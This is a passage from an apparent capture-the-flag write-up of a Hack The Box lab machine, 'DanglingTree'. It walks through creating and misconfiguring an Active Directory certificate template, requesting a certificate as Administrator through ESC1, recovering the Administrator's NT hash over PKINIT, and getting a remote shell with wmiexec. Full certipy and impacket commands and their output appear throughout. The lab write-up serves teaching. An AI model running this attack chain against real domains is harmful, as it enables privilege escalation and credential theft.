[+] Created OID DN:    CN=403.2900CD185C41DF93C0BD6497E8A81DA9,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb
[+] Template ready at: CN=EmployeeAuthTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb
[+] Authenticated Users now have full control on the template
```

The template — named `EmployeeAuthTemplate`, chosen deliberately to blend in with what would look like a legitimate, pre-existing corporate template — now exists in the directory.

Next, `certipy-ad`'s own `template` subcommand is used to push it further into a guaranteed-exploitable state, explicitly writing a "default" ESC1-style configuration and re-pointing its enrollment rights at the well-known Authenticated Users SID:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ certipy-ad template -u JAKE.H@danglingtree.htb -p Password123! -template EmployeeAuthTemplate -dc-ip 10.129.47.118 -write-default-configuration S-1-5-11 -no-save -force 
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'EmployeeAuthTemplate'
[*] Adding:
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9cD\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x000\x00\x02\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x00\x00\x14\x00\x94\x00\x02\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*] Successfully updated 'EmployeeAuthTemplate'
```

`certipy template -write-default-configuration` is normally a *defensive* command — it exists so a defender can restore a template that's been tampered with back to a sane, known-good state. Here it's being used offensively for the opposite reason: to stamp the template we just created with a fully consistent, "textbook ESC1" configuration in one shot, ensuring nothing about our hand-built LDAP object was subtly wrong or would fail Windows' own template validation logic. `-no-save -force` simply tell Certipy to skip writing a backup file and to not prompt for confirmation before applying the change (as `alex.o`'s delegated identity, not as `jake.h`, notice the `-u JAKE.H` — meaning this step is actually still being driven under the credential set we already recovered).

Let's confirm the template is now genuinely flagged as vulnerable:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ certipy-ad find -target DC.danglingtree.htb -u JAKE.H -p Password123! -vulnerable -stdout -dc-ip 10.129.47.118
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 17 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'danglingtree-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'danglingtree-DC-CA'
[*] Checking web enrollment for CA 'danglingtree-DC-CA' @ 'dc.danglingtree.htb'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : danglingtree-DC-CA
    DNS Name                            : dc.danglingtree.htb
    Certificate Subject                 : CN=danglingtree-DC-CA, DC=danglingtree, DC=htb
    Certificate Serial Number           : 6E77D503246E55B34D28C464F186BD4B
    Certificate Validity Start          : 2026-08-03 16:32:49+00:00
    Certificate Validity End            : 2126-08-03 16:42:49+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : DANGLINGTREE.HTB\Administrators
      Access Rights
        Enroll                          : DANGLINGTREE.HTB\Authenticated Users
        ManageCertificates              : DANGLINGTREE.HTB\Helpdesk_Cert_Support
                                          DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
                                          DANGLINGTREE.HTB\Administrators
        ManageCa                        : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
                                          DANGLINGTREE.HTB\Administrators
    [+] User Enrollable Principals      : DANGLINGTREE.HTB\Authenticated Users
    [+] User ACL Principals             : DANGLINGTREE.HTB\Helpdesk_Cert_Support
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
Certificate Templates
  0
    Template Name                       : EmployeeAuthTemplate
    Display Name                        : EmployeeAuthTemplate
    Certificate Authorities             : danglingtree-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-09-19T05:26:17+00:00
    Template Last Modified              : 2026-09-19T05:28:28+00:00
    Permissions
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\jake.h
        Full Control Principals         : DANGLINGTREE.HTB\Authenticated Users
        Write Owner Principals          : DANGLINGTREE.HTB\Authenticated Users
        Write Dacl Principals           : DANGLINGTREE.HTB\Authenticated Users
    [+] User Enrollable Principals      : DANGLINGTREE.HTB\Authenticated Users
    [+] User ACL Principals             : DANGLINGTREE.HTB\jake.h
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC4                              : Template is owned by user.
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
```

Certipy now confirms exactly what we engineered: `Enrollee Supplies Subject: True` and `Extended Key Usage: Client Authentication` together trigger the **ESC1** flag directly (enroll for a cert claiming to be anyone, then authenticate as them). It also flags **ESC4** simply because `jake.h` owns the template object outright — ownership alone grants implicit full control over an object's ACL in Windows, meaning even without today's specific misconfiguration, an owner could always re-introduce one later. And **ESC15** references CVE-2024-49019, a real-world flaw affecting older "schema version 1" templates where certain application-policy extensions can be abused to claim client-auth capability even on templates that weren't explicitly designed for it — an extra layer of exploitability stacked on top of the ESC1 primitive we've already built directly.

Finally, `jake.h` himself (now the template's rightful owner) re-applies the same default configuration directly, confirming he genuinely holds working control over the object without needing to lean on `alex.o`'s original delegated rights anymore:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ certipy-ad template -target DC.danglingtree.htb -u jake.h@danglingtree.htb -p Password123! -dc-ip 10.129.47.118 -template EmployeeAuthTemplate -write-default-configuration -no-save                                
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'EmployeeAuthTemplate'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9cD\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x000\x00\x02\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x00\x00\x14\x00\x94\x00\x02\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
Are you sure you want to apply these changes to 'EmployeeAuthTemplate'? (y/N): y
[*] Successfully updated 'EmployeeAuthTemplate'
```

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ certipy-ad find -target DC.danglingtree.htb -u JAKE.H -p Password123! -vulnerable -stdout -dc-ip 10.129.47.118
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 17 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'danglingtree-DC-CA' via RRP
[*] Successfully retrieved CA configuration for 'danglingtree-DC-CA'
[*] Checking web enrollment for CA 'danglingtree-DC-CA' @ 'dc.danglingtree.htb'
[*] Enumeration output:
```

With the template's configuration double-confirmed and stable, everything is in place for the final move: actually requesting a certificate off it that claims to be someone we're not.

### Phase 15: ESC1 in Action — Requesting a Certificate as Administrator

This is the step that turns everything above into full Domain Admin. Because `EmployeeAuthTemplate` lets the *requester* supply the subject identity (`ENROLLEE_SUPPLIES_SUBJECT`) and permits Client Authentication, we can ask the CA for a certificate that embeds the **User Principal Name (UPN) and SID of the built-in `administrator` account**, rather than our own identity as `jake.h`:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ certipy-ad req -u jake.h@danglingtree.htb -p Password123! -dc-ip 10.129.47.118 -dc-host dc.danglingtree.htb -ca danglingtree-DC-CA -template EmployeeAuthTemplate -upn administrator@danglingtree.htb -sid S-1-5-21-4220238332-57023728-1129110646-500 -dynamic-endpoint -out administrator.pfx
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 18
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@danglingtree.htb'
[*] Certificate object SID is 'S-1-5-21-4220238332-57023728-1129110646-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Notice that SID: `...-500`. In every Windows domain, the built-in `Administrator` account always carries RID `500` — the very same well-known-RID convention that made our earlier RID-cycling attack possible in the first place. By explicitly supplying both `-upn administrator@danglingtree.htb` and that exact SID, we're not just asking for "a certificate that says Administrator" in name — we're embedding the cryptographically-verifiable **SID security extension** that Windows Kerberos/PKINIT authentication actually checks, ensuring the resulting certificate is unambiguously treated as belonging to the real built-in Administrator object, not merely an account with a similar-looking name.

Because the CA authenticated and processed this request purely based on `jake.h`'s legitimate — if newly self-granted — enrollment rights on this template, it issued the certificate without hesitation: the CA has no way to know the template requesting an "administrator" identity is one we built from nothing minutes earlier.

With `administrator.pfx` (the certificate plus its private key) in hand, we use it to authenticate via **PKINIT** — Kerberos's certificate-based pre-authentication extension — and pull out the account's actual NTLM hash:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ sudo ntpdate -u DC.danglingtree.htb && certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.47.118 -domain danglingtree.htb
2026-09-19 01:35:13.965059 (-0400) +25150.437733 +/- 0.037154 DC.danglingtree.htb 10.129.47.118 s1 no-leap
CLOCK: time stepped by 25150.437733
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@danglingtree.htb'
[*]     SAN URL SID: 'S-1-5-21-4220238332-57023728-1129110646-500'
[*]     Security Extension SID: 'S-1-5-21-4220238332-57023728-1129110646-500'
[*] Using principal: 'administrator@danglingtree.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@danglingtree.htb': aad3b435b51404eeaad3b435b51404ee:8cacb3a97e460c65d105ca7cd9913925
```

Two things happen here in one command. First, `certipy-ad auth` uses the certificate exactly the way a smart card would: it hands the `.pfx` to the KDC as PKINIT pre-authentication material and receives back a genuine **TGT (Ticket-Granting Ticket)** for `administrator@danglingtree.htb` — real, usable Kerberos tickets, obtained without ever knowing the actual account password. Second, as a bonus, Certipy leverages a quirk of PKINIT (the **`U2U` — user-to-user — trick built into the protocol's `PA-PK-AS-REP`/`NTLM_SUPPLEMENTAL_CREDENTIAL` structure**) to also recover the account's raw NTLM hash directly from that exchange, giving us a second, independent way to authenticate as Administrator going forward if we ever need to.

Note the `ntpdate` call chained on again — same reason as before, PKINIT is just as time-sensitive as regular Kerberos.

We export the freshly obtained ticket cache as our active Kerberos credential:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ export KRB5CCNAME=administrator.ccache
```

### Phase 16: Full Domain Compromise

With a valid Administrator TGT sitting in our credential cache, we use `impacket-wmiexec` — which drives remote command execution through the WMI (Windows Management Instrumentation) service — authenticating purely via Kerberos (`-k -no-pass`, meaning "use whatever ticket is already in `KRB5CCNAME`, don't ask for a password at all"):

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ sudo ntpdate -u DC.danglingtree.htb && impacket-wmiexec administrator@dc.danglingtree.htb -k -no-pass -shell-type powershell
2026-09-19 01:37:55.703844 (-0400) +25148.898594 +/- 0.041990 DC.danglingtree.htb 10.129.47.118 s1 no-leap
CLOCK: time stepped by 25148.898594
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
PS C:\> whoami
danglingtree\administrator
```

Full domain compromise, confirmed: `danglingtree\administrator`, reached without ever knowing the account's real password — just a chain of a leaked test credential, a management console doing its job, a "localhost-only" API that wasn't, broken homegrown cryptography, a graph-revealed ACL edge, and a self-issued certificate.

```powershell
PS C:\> cat C:\Users\Administrator\Desktop\root.txt
[REDACTED]
```

## Conclusion

And that's the box — full compromise achieved, starting from an unauthenticated file share all the way through a leaked Rules-of-Engagement PDF, RID cycling around a locked-down account, a Windows Admin Center RCE that required no exploit at all, a loopback-trust bypass via Ligolo-ng, homegrown DES encryption with hardcoded keys, a BloodHound-revealed ACL chain, and a from-scratch ADCS ESC1 template built entirely over raw LDAP. A great reminder that "no single critical vulnerability" doesn't mean "no path to Domain Admin" — sometimes it just means the path is built out of five or six things nobody thought were dangerous on their own.
